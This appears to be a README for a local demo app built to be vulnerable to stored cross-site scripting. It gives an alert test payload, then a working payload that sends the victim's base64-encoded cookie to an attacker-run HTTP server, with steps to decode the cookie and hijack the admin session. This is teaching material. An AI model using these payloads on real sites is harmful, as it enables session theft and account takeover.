# to run web app
```
./build_run.sh
```

# How to run demo
- Url: http://localhost:PORT_NUMBER
- Open a browser as admin
	- Access Login page and login with username, password (admin, 123456)
- Open a browser as attacker
	- Access xss Page and insert the payload

# payload to testing xss (Expected result  - You will she the pop-up HelloWorld)
```
<img src=hello onerror="alert('Hello World')" />
```

# payload to exploit steal cookie victim and send to the attacker server.

* Step 1: Run a webserver to get the data that is steal from end users (This is http endpoint will 
replace the url_attacker in payload in step 2)
```
python3 -m http.server 8888
```

* Step 2: Replace the url_attacker that get from step 1 for the payload and access like a attacker and post a comment 
```
<img src=hello onerror=fetch(`${url_attacker}?cookie=${btoa(document.cookie)}`) />
```

* Step 3: Admin Browser access the comment page (/xss page)
* Step 4: Check log of server in step 1 to check the payload
* Step 5: Get the result in console and decode to see the victim cookie in plantext
```
echo ${cookie_encoded} | base64 -d
```
* Step 6: In the Attacker Browser, set the cookie with the value that is result in step 5 and you are admin(you hacked the admin permission and do anything)
  - Access Cookies
  - Name: User
  - Value: the value that is result in step 5
  - Path: /
After that you can access the admin page without login


# Notes
- Database will de deleted when you re-created the application(Docker container). Default db_path is /tmp/data.db